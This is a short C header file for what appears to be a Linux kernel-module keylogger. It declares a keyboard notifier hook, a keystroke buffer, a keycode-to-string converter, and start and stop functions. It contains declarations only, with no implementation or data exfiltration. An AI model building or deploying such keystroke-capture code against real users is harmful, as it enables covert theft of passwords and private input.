#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_
#include "./fops.h"
#include "./keys.h"
#include "./module.h"
#define DEVICE_NAME "Keylogger"
/*vars for makeing files*/
/*########*/
//int ret ;
//int len;

/*Vars for keystroke & strings save*/
extern char msg_Ptr[BUFF_SIZE];
extern size_t buf_pos;

int keycode_to_string(int key_press, int shift, char* buff);
int notifier(struct notifier_block* block, unsigned long code, void* p);
static struct notifier_block keylogger = { .notifier_call = notifier };
int run_keylogger(void);
void stop_keylogger(void);

#endif